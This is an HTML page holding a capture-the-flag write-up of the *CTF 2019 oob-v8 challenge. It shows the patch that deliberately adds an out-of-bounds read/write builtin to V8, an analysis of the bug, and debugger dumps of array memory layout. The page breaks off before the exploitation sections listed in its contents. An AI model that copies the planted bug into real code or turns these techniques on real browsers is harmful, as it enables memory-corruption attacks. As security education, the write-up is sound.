<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <title>*CTF 2019 - oob-v8 - Even - A super concise theme for Hugo</title>
  <meta name="renderer" content="webkit" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>

<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">


<meta name="author" content="ulexec" /><meta name="description" content="This post will cover the chrome exploit challenge oob-v8 from *CTF. The challenge can be found here.
01 -Analyzing the Patch if we take a close look at the patch oob.diff from the *CTF v8-oob challenge we will observe the introduction of the ArrayOob function. Authors of this challenge didn&amp;rsquo;t really wanted to make the discovery of the vulnerability a hard task, and there are even comments for the read/write primitives." /><meta name="keywords" content="Hugo, theme, even" />






<meta name="generator" content="Hugo 0.107.0 with theme even" />


<link rel="canonical" href="http://ulexec.github.io/post/2021-05-20-startctf2019_oobv8/" />
<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="manifest" href="/manifest.json">
<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">



<link href="/sass/main.min.24b6bc5d736ac336a76f43f4279d691d2513ec072ed82cd608a6120e0aa90b85.css" rel="stylesheet">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">


<meta property="og:title" content="*CTF 2019 - oob-v8" />
<meta property="og:description" content="This post will cover the chrome exploit challenge oob-v8 from *CTF. The challenge can be found here.
01 -Analyzing the Patch if we take a close look at the patch oob.diff from the *CTF v8-oob challenge we will observe the introduction of the ArrayOob function. Authors of this challenge didn&rsquo;t really wanted to make the discovery of the vulnerability a hard task, and there are even comments for the read/write primitives." />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://ulexec.github.io/post/2021-05-20-startctf2019_oobv8/" /><meta property="article:section" content="post" />
<meta property="article:published_time" content="2021-05-20T00:00:00+00:00" />
<meta property="article:modified_time" content="2021-05-20T00:00:00+00:00" />

<meta itemprop="name" content="*CTF 2019 - oob-v8">
<meta itemprop="description" content="This post will cover the chrome exploit challenge oob-v8 from *CTF. The challenge can be found here.
01 -Analyzing the Patch if we take a close look at the patch oob.diff from the *CTF v8-oob challenge we will observe the introduction of the ArrayOob function. Authors of this challenge didn&rsquo;t really wanted to make the discovery of the vulnerability a hard task, and there are even comments for the read/write primitives."><meta itemprop="datePublished" content="2021-05-20T00:00:00+00:00" />
<meta itemprop="dateModified" content="2021-05-20T00:00:00+00:00" />
<meta itemprop="wordCount" content="5464">
<meta itemprop="keywords" content="pwn,ctf,chrome," /><meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="*CTF 2019 - oob-v8"/>
<meta name="twitter:description" content="This post will cover the chrome exploit challenge oob-v8 from *CTF. The challenge can be found here.
01 -Analyzing the Patch if we take a close look at the patch oob.diff from the *CTF v8-oob challenge we will observe the introduction of the ArrayOob function. Authors of this challenge didn&rsquo;t really wanted to make the discovery of the vulnerability a hard task, and there are even comments for the read/write primitives."/>

<!--[if lte IE 9]>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
<![endif]-->

<!--[if lt IE 9]>
  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
<![endif]-->

</head>
<body>
  <div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/" class="logo">ulexec 의 연구</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>
<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list">
    <a href="/">
        <li class="mobile-menu-item">Home</li>
      </a><a href="/post/">
        <li class="mobile-menu-item">Archives</li>
      </a><a href="/tags/">
        <li class="mobile-menu-item">Tags</li>
      </a><a href="/about/">
        <li class="mobile-menu-item">About</li>
      </a>
  </ul>

  


</nav>

  <div class="container" id="mobile-panel">
    <header id="header" class="header">
        <div class="logo-wrapper">
  <a href="/" class="logo">ulexec 의 연구</a>
</div>





<nav class="site-navbar">
  <ul id="menu" class="menu">
    <li class="menu-item">
        <a class="menu-item-link" href="/">Home</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/post/">Archives</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/tags/">Tags</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/about/">About</a>
      </li>
  </ul>
</nav>

    </header>

    <main id="main" class="main">
      <div class="content-wrapper">
        <div id="content" class="content">
          <article class="post">
    
    <header class="post-header">
      <h1 class="post-title">*CTF 2019 - oob-v8</h1>

      <div class="post-meta">
        <span class="post-time"> 2021-05-20 </span>
        <div class="post-category">
            <a href="/categories/writeup/"> Writeup </a>
            </div>
          <span class="more-meta"> 5464 words </span>
          <span class="more-meta"> 26 mins read </span>
        
      </div>
    </header>

    <div class="post-toc" id="post-toc">
  <h2 class="post-toc-title">Contents</h2>
  <div class="post-toc-content always-active">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#01--analyzing-the-patch">01 -Analyzing the Patch</a></li>
    <li><a href="#02---leveraging-the-oob-vulnerabilities">02 - Leveraging the OOB vulnerabilities</a></li>
    <li><a href="#03---the-addrof-and-fakeobj-primitives">03 - The AddrOf and FakeObj Primitives</a></li>
    <li><a href="#04---introducing-an-arbitrary-read-primitive">04 - Introducing an Arbitrary Read Primitive</a></li>
    <li><a href="#05---introducing-an-arbitrary-write-primitive">05 - Introducing an Arbitrary Write Primitive</a></li>
    <li><a href="#06---exploitation">06 - Exploitation</a>
      <ul>
        <li>
          <ul>
            <li><a href="#version-information">Version information:</a></li>
            <li><a href="#0601---overwritting-__free_hook-to-system">06.01 - Overwritting __free_hook to system</a></li>
            <li><a href="#0602---rwx-webassembly-pages">06.02 - RWX WebAssembly pages</a></li>
          </ul>
        </li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</div>
    <div class="post-content">
      <p>This post will cover the chrome exploit challenge <code>oob-v8</code> from *<em>CTF</em>.
The challenge can be found <a href="https://github.com/Changochen/CTF/raw/master/2019/*ctf/Chrome.tar.gz">here</a>.</p>
<h1 id="01--analyzing-the-patch">01 -Analyzing the Patch</h1>
<p>if we take a close look at the patch <code>oob.diff</code> from the *<em>CTF</em> v8-oob challenge we will observe the introduction of the <code>ArrayOob</code> function. Authors of this challenge didn&rsquo;t really wanted to make the discovery of the vulnerability a hard task, and there are even comments for the read/write primitives.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-diff" data-lang="diff"><span class="line"><span class="cl"><span class="gh">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
</span></span></span><span class="line"><span class="cl"><span class="gh">index 8df340e..9b828ab 100644
</span></span></span><span class="line"><span class="cl"><span class="gh"></span><span class="gd">--- a/src/builtins/builtins-array.cc
</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+++ b/src/builtins/builtins-array.cc
</span></span></span><span class="line"><span class="cl"><span class="gi"></span><span class="gu">@@ -361,6 +361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,
</span></span></span><span class="line"><span class="cl"><span class="gu"></span>   return *final_length;
</span></span><span class="line"><span class="cl"> }
</span></span><span class="line"><span class="cl"> }  // namespace
</span></span><span class="line"><span class="cl"><span class="gi">+BUILTIN(ArrayOob){
</span></span></span><span class="line"><span class="cl"><span class="gi">+    uint32_t len = args.length();
</span></span></span><span class="line"><span class="cl"><span class="gi">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();
</span></span></span><span class="line"><span class="cl"><span class="gi">+    Handle&lt;JSReceiver&gt; receiver;
</span></span></span><span class="line"><span class="cl"><span class="gi">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
</span></span></span><span class="line"><span class="cl"><span class="gi">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));
</span></span></span><span class="line"><span class="cl"><span class="gi">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);
</span></span></span><span class="line"><span class="cl"><span class="gi">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());
</span></span></span><span class="line"><span class="cl"><span class="gi">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());
</span></span></span><span class="line"><span class="cl"><span class="gi">+    if(len == 1){
</span></span></span><span class="line"><span class="cl"><span class="gi">+        //read
</span></span></span><span class="line"><span class="cl"><span class="gi">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));
</span></span></span><span class="line"><span class="cl"><span class="gi">+    }else{
</span></span></span><span class="line"><span class="cl"><span class="gi">+        //write
</span></span></span><span class="line"><span class="cl"><span class="gi">+        Handle&lt;Object&gt; value;
</span></span></span><span class="line"><span class="cl"><span class="gi">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
</span></span></span><span class="line"><span class="cl"><span class="gi">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));
</span></span></span><span class="line"><span class="cl"><span class="gi">+        elements.set(length,value-&gt;Number());
</span></span></span><span class="line"><span class="cl"><span class="gi">+        return ReadOnlyRoots(isolate).undefined_value();
</span></span></span><span class="line"><span class="cl"><span class="gi">+    }
</span></span></span><span class="line"><span class="cl"><span class="gi">+}
</span></span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>Arguments passed will be checked to be greater than 2.
If arguments are greater than 2, the function returns an undefined value</li>
<li>The <code>JSArray</code> is casted into a <code>FixedDoubleArray</code>.</li>
<li>The <code>length</code> variable will hold the length of the array. Lets remember that the length of the array should be length-1 since the first element of the array would be a pointer to <code>this</code>, and therefore not being part of the Array&rsquo;s elements.</li>
<li>If the number of arguments is 1, meaning no arguments other than <code>this</code>, then the function will return the element at position <code>elements[length]</code>. This denotes an OOB read by one index, as the real index of the first element should be 0.</li>
<li>If the number of arguments is 2, meaning one additional argument apart from <code>this</code>, the element at index <code>elements[length]</code>, will be set to the value of <code>value</code>. That denotes an OOB write by one index.</li>
</ul>
<h1 id="02---leveraging-the-oob-vulnerabilities">02 - Leveraging the OOB vulnerabilities</h1>
<p>As we were able to analyze, we essentially have two vulnerabilities. An OOB read and an OOB write.</p>
<p>How can we leverage these vulnerabilities? Thats exactly the question we will be answering in this section.</p>
<p>First of all, we know that the vulnerable code, only affects arrays as is implemented as an array property.</p>
<p>Furthermore, we know that each Array can hold elements of different kind. Depending of their kind, Array elements will be stored in different ways, including them being inlined and out-of-line in the given internal holding object of a <code>JSArray</code> object.</p>
<p>For example, lets look at a an <code>JSArray</code> with elements of kind <code>PACKED_ELEMENTS</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">a</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="s2">&#34;1&#34;</span><span class="p">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>If we inspect this Array in GDB with <code>d8</code> debug build we can see how these elements are stored:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">d8</span><span class="o">&gt;</span> <span class="o">%</span><span class="nf">DebugPrint</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">DebugPrint</span><span class="p">:</span> <span class="mh">0x34e829bd1499</span><span class="o">:</span> <span class="p">[</span><span class="n">JSArray</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nl">map</span><span class="p">:</span> <span class="mh">0x23fe2f482f79</span> <span class="o">&lt;</span><span class="nf">Map</span><span class="p">(</span><span class="n">PACKED_ELEMENTS</span><span class="p">)</span><span class="o">&gt;</span> <span class="p">[</span><span class="n">FastProperties</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nl">prototype</span><span class="p">:</span> <span class="mh">0x1a89b9ad1111</span> <span class="o">&lt;</span><span class="n">JSArray</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nl">elements</span><span class="p">:</span> <span class="mh">0x34e829bd1429</span> <span class="o">&lt;</span><span class="n">FixedArray</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="o">&gt;</span> <span class="p">[</span><span class="nf">PACKED_ELEMENTS</span> <span class="p">(</span><span class="n">COW</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nl">length</span><span class="p">:</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nl">properties</span><span class="p">:</span> <span class="mh">0x39bc44b00c71</span> <span class="o">&lt;</span><span class="n">FixedArray</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="cp">#length: 0x335aec1001a9 &lt;AccessorInfo&gt; (const accessor descriptor)
</span></span></span><span class="line"><span class="cl"><span class="cp"></span> <span class="p">}</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nl">elements</span><span class="p">:</span> <span class="mh">0x34e829bd1429</span> <span class="o">&lt;</span><span class="n">FixedArray</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="o">&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">           <span class="mi">0</span><span class="o">:</span> <span class="mh">0x1a89b9ae2761</span> <span class="o">&lt;</span><span class="n">HeapNumber</span> <span class="mf">1.1</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">           <span class="mi">1</span><span class="o">:</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl">           <span class="mi">2</span><span class="o">:</span> <span class="mh">0x1a89b9ae26c9</span> <span class="o">&lt;</span><span class="n">String</span><span class="p">[</span><span class="err">#</span><span class="mi">1</span><span class="p">]</span><span class="o">:</span> <span class="mi">5</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="err">─────────────────────────────────────────────────────────────────────────────</span>
</span></span><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">4</span><span class="n">xg</span> <span class="mh">0x34e829bd1499</span><span class="o">-</span><span class="mi">1</span>							<span class="c1">// JSArray
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mh">0x34e829bd1498</span><span class="o">:</span>	<span class="mh">0x000023fe2f482f79</span>	<span class="mh">0x000039bc44b00c71</span>
</span></span><span class="line"><span class="cl"><span class="c1">//					^---map                 ^---properties
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mh">0x34e829bd14a8</span><span class="o">:</span>	<span class="mh">0x000034e829bd1429</span>	<span class="mh">0x0000000300000000</span>
</span></span><span class="line"><span class="cl"><span class="c1">//					^---elements
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">18</span><span class="n">xg</span> <span class="mh">0x000034e829bd1429</span><span class="o">-</span><span class="mi">1</span>						<span class="c1">// elements pointer
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mh">0x34e829bd1428</span><span class="o">:</span>	<span class="mh">0x000039bc44b00851</span>	<span class="mh">0x0000000300000000</span>  <span class="c1">// FixedArray
</span></span></span><span class="line"><span class="cl"><span class="c1">//					^--- map                ^---- length
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mh">0x34e829bd1438</span><span class="o">:</span>	<span class="mh">0x00001a89b9ae2761</span>	<span class="mh">0x0000000300000000</span>
</span></span><span class="line"><span class="cl"><span class="c1">//					^--- HeapNumber 1.1     ^---- Smi 3
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mh">0x34e829bd1448</span><span class="o">:</span>	<span class="mh">0x00001a89b9ae26c9</span>	<span class="mh">0x000039bc44b00851</span>
</span></span><span class="line"><span class="cl"><span class="c1">//					^--- String[#1]			^---- another Map instance
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mh">0x34e829bd1458</span><span class="o">:</span>	<span class="mh">0x0000000400000000</span>	<span class="mh">0x0000335aec108039</span>  <span class="c1">// -+
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mh">0x34e829bd1468</span><span class="o">:</span>	<span class="mh">0x000034e829bd13e9</span>	<span class="mh">0x0000000000000000</span>  <span class="c1">//  | other related
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mh">0x34e829bd1478</span><span class="o">:</span>	<span class="mh">0xffffffff00000000</span>	<span class="mh">0x000039bc44b012c9</span>  <span class="c1">//  | HeapObjects
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mh">0x34e829bd1488</span><span class="o">:</span>	<span class="mh">0x0000000100000000</span>	<span class="mh">0x0000040000000000</span>  <span class="c1">// -+
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mh">0x34e829bd1498</span><span class="o">:</span>	<span class="mh">0x000023fe2f482f79</span>	<span class="mh">0x000039bc44b00c71</span>  <span class="c1">// JSArray
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mh">0x34e829bd14a8</span><span class="o">:</span>	<span class="mh">0x000034e829bd1429</span>	<span class="mh">0x0000000300000000</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>As we can observe, there are a few other allocated HeapObjects consecutively after the <code>JSArray</code>&rsquo;s&rsquo; elements. But we will soon realize, this is not the case for Arrays with different elements kinds. Lets look another example of a <code>JSArray</code> with elements of kind <code>PACKED_DOUBLE_ELEMENTS</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">b</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.2</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Looking at the <code>d8</code> debug build in GDB we see the following:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">d8</span><span class="o">&gt;</span> <span class="o">%</span><span class="nf">DebugPrint</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">DebugPrint</span><span class="p">:</span> <span class="mh">0x34e829bd1ad1</span><span class="o">:</span> <span class="p">[</span><span class="n">JSArray</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nl">map</span><span class="p">:</span> <span class="mh">0x23fe2f482ed9</span> <span class="o">&lt;</span><span class="nf">Map</span><span class="p">(</span><span class="n">PACKED_DOUBLE_ELEMENTS</span><span class="p">)</span><span class="o">&gt;</span> <span class="p">[</span><span class="n">FastProperties</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nl">prototype</span><span class="p">:</span> <span class="mh">0x1a89b9ad1111</span> <span class="o">&lt;</span><span class="n">JSArray</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nl">elements</span><span class="p">:</span> <span class="mh">0x34e829bd1ab1</span> <span class="o">&lt;</span><span class="n">FixedDoubleArray</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">&gt;</span> <span class="p">[</span><span class="n">PACKED_DOUBLE_ELEMENTS</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nl">length</span><span class="p">:</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nl">properties</span><span class="p">:</span> <span class="mh">0x39bc44b00c71</span> <span class="o">&lt;</span><span class="n">FixedArray</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="cp">#length: 0x335aec1001a9 &lt;AccessorInfo&gt; (const accessor descriptor)
</span></span></span><span class="line"><span class="cl"><span class="cp"></span> <span class="p">}</span>
</span></span><span class="line"><span class="cl"> <span class="o">-</span> <span class="nl">elements</span><span class="p">:</span> <span class="mh">0x34e829bd1ab1</span> <span class="o">&lt;</span><span class="n">FixedDoubleArray</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">           <span class="mi">0</span><span class="o">:</span> <span class="mf">1.2</span>
</span></span><span class="line"><span class="cl">           <span class="mi">1</span><span class="o">:</span> <span class="mf">1.1</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="err">─────────────────────────────────────────────────────────────────────────────</span>
</span></span><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">4</span><span class="n">xg</span> <span class="mh">0x34e829bd1ad1</span><span class="o">-</span><span class="mi">1</span>                           <span class="c1">// JSArray
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mh">0x34e829bd1ad0</span><span class="o">:</span>	<span class="mh">0x000023fe2f482ed9</span>	<span class="mh">0x000039bc44b00c71</span>
</span></span><span class="line"><span class="cl"><span class="c1">//                    ^---map                 ^---properties
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mh">0x34e829bd1ae0</span><span class="o">:</span>	<span class="mh">0x000034e829bd1ab1</span>	<span class="mh">0x0000000200000000</span>
</span></span><span class="line"><span class="cl"><span class="c1">//                    ^---elements
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">8</span><span class="n">xg</span> <span class="mh">0x000034e829bd1ab1</span><span class="o">-</span><span class="mi">1</span>                       <span class="c1">// elements pointer
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mh">0x34e829bd1ab0</span><span class="o">:</span>	<span class="mh">0x000039bc44b014f9</span>	<span class="mh">0x0000000200000000</span>   <span class="c1">// FixedDoubleArray
</span></span></span><span class="line"><span class="cl"><span class="c1">//                    ^--- map                ^--- length
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mh">0x34e829bd1ac0</span><span class="o">:</span>	<span class="mh">0x3ff3333333333333</span>	<span class="mh">0x3ff199999999999a</span>
</span></span><span class="line"><span class="cl"><span class="c1">//                    ^--- 1.2                ^--- 1.1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mh">0x34e829bd1ad0</span><span class="o">:</span>	<span class="mh">0x000023fe2f482ed9</span>	<span class="mh">0x000039bc44b00c71</span>   <span class="c1">// JSArray
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mh">0x34e829bd1ae0</span><span class="o">:</span>	<span class="mh">0x000034e829bd1ab1</span>	<span class="mh">0x0000000200000000</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>As we can see, for a <code>JSArray</code> of elements of kind <code>PACKED_DOUBLE_ELEMENTS</code>, these are stored as 64bit doubles, and there is no other consecutive objects after the JSArray elements.</p>
<p>This is relevant since our OOB vulnerabilities only enable us to write/read the next field after the last element of our <code>JSArray</code> object. Therefore, we can already tell that depending which kind of elements we use, we will be able to read/wrtie a different map instance accordingly.</p>
<p>For the <code>JSArray</code> <code>a</code> with elements of kind <code>PACKED_ELEMENTS</code>, we will be able to read/write the map instance of the <code>FixedArray</code> object holding the elements of our <code>JSArray</code> object. We can see this debugging the <code>d8</code> release instance:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">d8</span><span class="o">&gt;</span> <span class="n">let</span> <span class="n">a</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="s">&#34;1&#34;</span><span class="p">]</span>   
</span></span><span class="line"><span class="cl"><span class="n">d8</span><span class="o">&gt;</span> <span class="s">&#34;0x&#34;</span><span class="o">+</span><span class="nf">ftoi</span><span class="p">(</span><span class="n">a</span><span class="p">.</span><span class="nf">oob</span><span class="p">()).</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="s">&#34;0x3882de940851&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">d8</span><span class="o">&gt;</span> <span class="o">%</span><span class="nf">DebugPrint</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mh">0x176d4ccd0d01</span> <span class="o">&lt;</span><span class="n">JSArray</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="err">─────────────────────────────────────────────────────────────────────────────</span>
</span></span><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">4</span><span class="n">xg</span> <span class="mh">0x176d4ccd0d01</span><span class="o">-</span><span class="mi">1</span>
